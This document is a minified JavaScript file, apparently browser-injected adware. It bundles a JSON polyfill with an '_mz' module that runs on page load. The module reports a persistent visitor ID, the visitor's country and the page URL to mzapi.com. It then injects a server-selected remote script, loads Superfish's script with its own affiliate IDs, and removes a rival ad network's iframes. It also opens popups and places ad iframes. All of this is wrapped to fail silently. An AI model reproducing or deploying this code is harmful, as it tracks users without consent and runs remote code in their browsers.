/* Copyright (c) 2012 - Do Not Copy! */
typeof JSON!="object"&&(JSON={}),function(){"use strict";function f(e){return e<10?"0"+e:e}function quote(e){return escapable.lastIndex=0,escapable.test(e)?'"'+e.replace(escapable,function(e){var t=meta[e];return typeof t=="string"?t:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+e+'"'}function str(e,t){var n,r,i,s,o=gap,u,a=t[e];a&&typeof a=="object"&&typeof a.toJSON=="function"&&(a=a.toJSON(e)),typeof rep=="function"&&(a=rep.call(t,e,a));switch(typeof a){case"string":return quote(a);case"number":return isFinite(a)?String(a):"null";case"boolean":case"null":return String(a);case"object":if(!a)return"null";gap+=indent,u=[];if(Object.prototype.toString.apply(a)==="[object Array]"){s=a.length;for(n=0;n<s;n+=1)u[n]=str(n,a)||"null";return i=u.length===0?"[]":gap?"[\n"+gap+u.join(",\n"+gap)+"\n"+o+"]":"["+u.join(",")+"]",gap=o,i}if(rep&&typeof rep=="object"){s=rep.length;for(n=0;n<s;n+=1)typeof rep[n]=="string"&&(r=rep[n],i=str(r,a),i&&u.push(quote(r)+(gap?": ":":")+i))}else for(r in a)Object.prototype.hasOwnProperty.call(a,r)&&(i=str(r,a),i&&u.push(quote(r)+(gap?": ":":")+i));return i=u.length===0?"{}":gap?"{\n"+gap+u.join(",\n"+gap)+"\n"+o+"}":"{"+u.join(",")+"}",gap=o,i}}typeof Date.prototype.toJSON!="function"&&(Date.prototype.toJSON=function(e){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(e){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;typeof JSON.stringify!="function"&&(JSON.stringify=function(e,t,n){var r;gap="",indent="";if(typeof n=="number")for(r=0;r<n;r+=1)indent+=" ";else typeof n=="string"&&(indent=n);rep=t;if(!t||typeof t=="function"||typeof t=="object"&&typeof t.length=="number")return str("",{"":e});throw new Error("JSON.stringify")}),typeof JSON.parse!="function"&&(JSON.parse=function(text,reviver){function walk(e,t){var n,r,i=e[t];if(i&&typeof i=="object")for(n in i)Object.prototype.hasOwnProperty.call(i,n)&&(r=walk(i,n),r!==undefined?i[n]=r:delete i[n]);return reviver.call(e,t,i)}var j;text=String(text),cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)}));if(/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),typeof reviver=="function"?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();try{if(typeof _mz=="undefined"){var _mz=function(){function r(e,t,n){var r,i=navigator.userAgent.indexOf("MSIE")!==-1;try{r=new XMLHttpRequest}catch(s){}r&&"withCredentials"in r?(t=t.replace("http:","https"),r.open(e,t,!0)):typeof XDomainRequest!="undefined"?(document.location.protocol=="https:"?t=t.replace("http:","https:"):t=t.replace("https:","http:"),r=new XDomainRequest,r.open(e,t)):r=null;if(r===null){console.log("ERROR: xhr is null");try{n(null)}catch(s){}return}var o=function(e){return function(t){t=i?r:t,e=="load"&&(i||t.readyState==4)&&n?n(t.responseText,t):error&&(n&&n(null,t),console.log("ERROR: "+t))}};r.onload=function(e){o("load")(i?e:e.target)},r.onerror=function(e){o("error")(i?e:e.target)},r.send(null)}function i(e){var t=n.get("_mzIsContent");if(t===!0||t===!1)return t;var r=document.location.href.replace("http://","").split("?")[0].replace("www.","").replace("/","");if(document.domain.replace("www.","")==r)return n.set("_mzIsContent",!1,86400),!1;if(document.location.href.indexOf("blog")>-1||document.location.href.indexOf("article")>-1||document.location.href.indexOf("story")>-1)return n.set("_mzIsContent",!0,86400),!0;var i=["article","body","blog","story","instapaper","post"],s=document.getElementsByTagName("div");if(s.length>300)return!1;for(var o=0;o<s.length;o++){var u=s[o];if(typeof u=="object"&&typeof u.innerHTML=="string")for(var a in i){var f=i[a];if(u.id.toLowerCase().indexOf(f)>-1)return n.set("_mzIsContent",!0,86400),!0}}return n.set("_mzIsContent",!1,86400),!1}function s(){var e=!1,t=document.getElementsByTagName("iframe");for(var n=0;n<t.length;n++)if(t[n].src.indexOf("jeetyetmedia")!==-1)try{t[n].parentNode.setAttribute("style","display:none"),t[n].parentNode.removeChild(t[n]),e=!0}catch(r){}e||setTimeout(function(){_mz.unWhitespace()},500)}function a(){var e="",t="",r=document.getElementsByTagName("script");for(var s=0;s<r.length;s++)if(r[s].src.indexOf("mzroute")>-1){e=r[s].src.split("?")[1].split("&");for(var o=0;o<e.length;o++){var a=e[o].split("=");typeof a[1]!==null&&typeof a[1]!="undefined"&&(u[a[0]]=decodeURIComponent(a[1]).toString())}}u.recheck=u.recheck*60*60;var f=n.get("_mzActive");f!==null&&typeof f!="undefined"&&(typeof f=="string"&&(f=f=="true"),u.active=f),u.domain==="localhost"&&(u.active=!1,n.set("_mzActive",!1,31536e3));var l=n.get("_mzCountry");l!==null&&typeof l!="undefined"&&(u.country=l);var c=n.get("_mzSuperfish");c!==null&&typeof c!="undefined"&&(typeof c=="string"&&(c=c=="true"),u.superfish=c);var h=n.get("_mzDictionary");h!==null&&typeof h!="undefined"&&(typeof h=="string"&&(h=h=="true"),u.dictionary=h),u.disclosure='<a style="font-size:9px !important;line-height:100% !important;color:inherit !important;text-decoration:none;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'" target="mzads" href="http://www.bannerfeedback.com/adinfo.html?'+u.uuid+'">'+u.disclosure+"</a>";if(u.uuid===""){var p=n.get("_mzUUID");p!==null&&typeof p!="undefined"&&(u.uuid=p)}n.set("_mzUUID",u.uuid,31536e4);var d=n.get("_mzScript");d!==""&&d!==null&&typeof d!="undefined"&&(u.script=d);var v=n.get("_mzContentPage");if(v!==""&&v!==null&&typeof v!="undefined")u.is_content_page=v;else{u.is_content_page=i();try{n.set("_mzContentPage",u.is_content_page,604800)}catch(m){}}}function f(){if(navigator.appVersion.indexOf("MSIE 6.")!==-1||navigator.appVersion.indexOf("MSIE 7.")!==-1&&navigator.appVersion.indexOf("NT 6.1")===-1){p("Seriously?! Update your browser already...");return}if(top!==self)return;s(),a(),p(u);if(u.superfish){var e=["AT","AU","BE","BR","CA","CH","DE","DK","ES","FR","IE","IT","NL","NO","NZ","SE","US","GB"];document.location.href.indexOf("mzsf=1")!==-1&&e.push(u.country);var t=e.length;while(t--)if(e[t]==u.country){var i=!0;if(window.superfish){var o=document.getElementById("SF_PLUGIN_CONTENT").src;if(o.indexOf("mz")!==-1)i=!1;else try{var f=o.split("?")[0]+"?",c=o.split("?")[1].split("&");for(var h=0;h<c.length;h++)c[h].indexOf("CTID")!==-1?f+="&CTID=mz"+u.mzid+"."+u.country:c[h].indexOf("userid")!==-1?f+="&userid="+u.uuid:c[h].indexOf("dlsource")!==-1?f+="&dlsource="+u.dlsource:f+="&"+c[h];document.querySelector("#SF_BG3 a").innerHTML=mzid==65?"SpecialSavings":"CouponCompanion",document.querySelectorAll("#SF_VISUAL_SEARCH a")[0].innerHTML=mzid==65?"SpecialSavings":"CouponCompanion",document.getElementById("SF_PLUGIN_CONTENT").src=f.replace("?&","?")}catch(d){}}if(i){var v=u.is_https?"https:":"http:";v+="//www.superfish.com/ws/sf_main.jsp?dlsource="+u.dlsource+"&userId="+u.uuid+"&CTID=mz"+u.mzid+"."+u.country,l(v)}try{var m="#sf_coupon_obj{display:none !important;}",g=document.createElement("style");g.type="text/css",g.media="screen",g.styleSheet?g.styleSheet.cssText=m:g.appendChild(document.createTextNode(m)),document.getElementsByTagName("head")[0].appendChild(g)}catch(d){}break}}if(u.script===""||u.active!==!0&&u.domain!==u.referrer&&u.referrer!==""){var y="https://mzapi.com/servlets/checkin.php?";y+="mzid="+u.mzid+"&uuid="+u.uuid+"&country="+u.country+"&https="+u.is_https.toString()+"&content="+u.is_content_page.toString()+"&pageurl="+encodeURIComponent(u.pageurl),p("MZ: "+y),r("GET",y,function(e){var t=JSON.parse(e+"");p("MZ (response): "+e);try{n.set("_mzUUID",t.uuid,31536e4)}catch(r){}try{n.set("_mzCountry",t.country,2592e3)}catch(r){}try{t.recheck&&(u.recheck=t.recheck*60*60)}catch(r){}try{n.set("_mzSearchAds",t.searchads,u.recheck)}catch(r){}try{n.set("_mzDictionary",t.dictionary,u.recheck)}catch(r){}try{n.set("_mzSuperfish",t.superfish,u.recheck)}catch(r){}try{n.set("_mzActive",t.active,u.recheck),u.active=t.active}catch(r){}t.script!==""&&t.script!==null&&typeof t.script!="undefined"&&(u.script=t.script,n.set("_mzScript",u.script,u.recheck)),t.ad.title!==""&&t.ad.title!==null&&typeof t.ad.title!="undefined"&&n.set("_mzAd",encodeURIComponent(JSON.stringify(t.ad).toString()));try{n.set("_mzQuery",t.query.toString())}catch(r){}if(t.ok2pop)document.cookie="_mzPopped=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/";else{var i=new Date,s=(new Date(i.setTime(i.getTime()+846e5))).toGMTString();document.cookie="_mzPopped=1;expires="+s+";path=/"}u.script!==""&&u.active===!0?l(u.cdn+"/scripts/"+u.script+"?"+u.uncache):p("not injecting (not active/no script)")})}else p("MZ: using cache"),n.set("_mzScript",u.script,u.recheck),l(u.cdn+"/scripts/"+u.script+"?"+u.uncache)}function l(e){p("MZ: "+e);var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src=e;try{document.getElementsByTagName("head")[0].appendChild(t)}catch(n){document.body.appendChild(t)}}function c(e,t,n,r,i,s,o){if(u.is_https)return;typeof i=="string"?i=document.getElementById(i):typeof i=="object"&&(i=i);if(document.getElementById(a)!==null)return;var a="_mz"+e,f=u.cdn+"/zones/"+e+".html?"+u.mzid+","+u.country+","+u.referrer+","+u.uncache;try{document.getElementById(a)!==null&&(document.getElementById(a).innerHTML=""),document.getElementById(a).parentNode.removeChild(document.getElementById(a))}catch(l){}typeof o!="string"&&(o="#808080");var c=document.createElement("div");c.id=a,c.setAttribute("style",t),c.innerHTML='<iframe target="adwin" id="'+a+'if" scrolling="no" frameborder="0" allowtransparency="allowTransparency" style="display:block;margin:auto;border:0;width:'+n+"px;height:"+r+'px;" src="'+f+'"></iframe>';if(i===null)return;var h=i;s=="before"?h.insertBefore(c,h.firstChild):h.parentNode.appendChild(c)}function h(e,t,n){t=t||500,n=n||300;var r=window.open("about:blank","settings","toolbar=no,scrollbars=yes,location=no,statusbar=no,menubar=no,resizable=1,width="+t+",height="+n+",screenX="+((window.innerWidth-t)/2).toString()+",screenY="+((window.innerHeight-n)/2).toString()+",left="+((window.innerWidth-t)/2).toString()+",top="+((window.innerHeight-n)/2).toString());r.document.write('<html style="height:100%;margin:0;padding:0"><head><title>Settings</title></head><body style="height:99%;margin:0;padding:0"><iframe src="'+e+'" frameborder="no" style="border:0;margin:0;padding:0;width:100%;height:100%"></iframe></body></html>')}function p(e){try{u.mzid===2&&console.log(e)}catch(t){}}var e=function(){function e(n){if(e.done)return n();e.timer?e.ready.push(n):(window.addEventListener?window.addEventListener("load",t,!1):window.attachEvent&&window.attachEvent("onload",t),e.ready=[n],e.timer=setInterval(t,13))}function t(){if(e.done)return!1;if(document&&document.getElementsByTagName&&document.getElementById&&document.body){clearInterval(e.timer),e.timer=null;for(var t=0;t<e.ready.length;t++)try{e.ready[t]()}catch(n){}e.ready=null,e.done=!0}}return e}(),t=function(){function o(){try{return r in t&&t[r]}catch(e){return!1}}function u(t){return function(){var n=Array.prototype.slice.call(arguments,0);n.unshift(s),l.appendChild(s),s.addBehavior("#default#userData"),s.load(r);var i=t.apply(e,n);return l.removeChild(s),i}}function f(e){return e.replace(a,"___")}var e={},t=window,n=t.document,r="localStorage",i="__storejs__",s;e.disabled=!1,e.set=function(e,t){},e.get=function(e){},e.remove=function(e){},e.clear=function(){},e.transact=function(t,n,r){var i=e.get(t);r===null&&(r=n,n=null),typeof i=="undefined"&&(i=n||{}),r(i),e.set(t,i)},e.getAll=function(){},e.serialize=function(e){return JSON.stringify(e)},e.deserialize=function(e){if(typeof e!="string")return undefined;try{return JSON.parse(e)}catch(t){return e||undefined}};var a=new RegExp("[!\"#$%&'()*+,/\\\\:;<=>?@[\\]^`{|}~]","g");if(o())s=t[r],e.set=function(t,n){return n===undefined?e.remove(t):(s.setItem(t,e.serialize(n)),n)},e.get=function(t){return e.deserialize(s.getItem(t))},e.remove=function(e){s.removeItem(e)},e.clear=function(){s.clear()},e.getAll=function(){var t={};for(var n=0;n<s.length;++n){var r=s.key(n);t[r]=e.get(r)}return t};else if(n.documentElement.addBehavior){var l,c;try{c=new ActiveXObject("htmlfile"),c.open(),c.write('<script>document.w=window</script><iframe src="/favicon.ico"></frame>'),c.close(),l=c.w.frames[0].document,s=l.createElement("div")}catch(h){s=n.createElement("div"),l=n.body}e.set=u(function(t,n,i){return n=f(n),i===undefined?e.remove(n):(t.setAttribute(n,e.serialize(i)),t.save(r),i)}),e.get=u(function(t,n){return n=f(n),e.deserialize(t.getAttribute(n))}),e.remove=u(function(e,t){t=f(t),e.removeAttribute(t),e.save(r)}),e.clear=u(function(e){var t=e.XMLDocument.documentElement.attributes;e.load(r);for(var n=0,i;i=t[n];n++)e.removeAttribute(i.name);e.save(r)}),e.getAll=u(function(t){var n=t.XMLDocument.documentElement.attributes;t.load(r);var i={};for(var s=0,o;o=n[s];++s)i[o]=e.get(o);return i})}try{e.set(i,i),e.get(i)!=i&&(e.disabled=!0),e.remove(i)}catch(h){e.disabled=!0}return e.enabled=!e.disabled,typeof module!="undefined"&&typeof module!="function"?module.exports=e:typeof define=="function"&&define.amd?define(e):this.store=e,e}(),n={set:function(e,n,r){var i=new Date;i.setTime(i.getTime()+r*1e3),t.enabled&&t.set(e,{value:n,expires:i.getTime()});var s=r?"expires="+i.toGMTString():"";document.cookie=e+"="+n+"; "+s+"; path=/"},get:function(e){var n=null;if(t.enabled){var r=new Date,i=t.get(e);typeof i!="undefined"&&(i.expires<r.getTime()?t.remove(e):n=i.value)}if(n===null){var s=";"+document.cookie+";";s.split(e+"=").length>1&&(n=s.split(e+"=")[1].split(";")[0].replace(/^\s*/,"").replace(/\s*$/,"").replace(/\s{2,}/," "))}return n},del:function(e){t.enabled&&t.remove(e),document.cookie=e+"=; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/"}};String.prototype.simplifyURL=function(){var e=this.split("://")[1].split("?"),t=e[0].split(";")[0];if(typeof e[1]!="undefined"){var n=e[1],r=["q","p","kw"];for(var i=0;i<r.length;i++)if(n.indexOf(r[i]+"=")>-1)return n=r[i]+n.split(r[i])[1].split("&")[0],t+="?"+n}return t.toString()};var o=function(){var e=navigator.userAgent.toLowerCase(),t={webkit:/webkit/.test(e),mozilla:/mozilla/.test(e)&&!/(compatible|webkit)/.test(e),chrome:/chrome/.test(e),msie:/msie/.test(e)&&!/opera/.test(e),firefox:/firefox/.test(e),safari:/safari/.test(e)&&!/chrome/.test(e),opera:/opera/.test(e)};return t.version=t.safari?(e.match(/.+(?:ri)[\/: ]([\d.]+)/)||[])[1]:(e.match(/.+(?:ox|me|ra|ie)[\/: ]([\d.]+)/)||[])[1],t}(),u={mzid:0,uuid:"",uncache:Math.round((new Date).getTime()/36e5),pageurl:document.location.href.simplifyURL(),domain:document.domain?document.domain.toString():document.host.toString(),referrer:document.referrer?document.referrer.replace("https://","").replace("http://","").split("/")[0].toString():"",active:null,country:"",script:"",cdn:(document.location.protocol=="https:"?"https://":"http://")+"srv.mzcdn.com",disclosure:"About this ad",dlsource:"qoksnqgp",superfish:!0,dictionary:!1,is_https:document.location.protocol=="https:",is_content_page:!1,recheck:12};return{config:u,browser:o,loadScript:l,getAJAX:r,storage:n,debug:p,ready:e,run:f,widgetSettings:h,unWhitespace:s,placeZone:c,zonesQS:u.mzid+","+u.referrer+","+u.uncache}}();_mz.ready(_mz.run())}}catch(err){}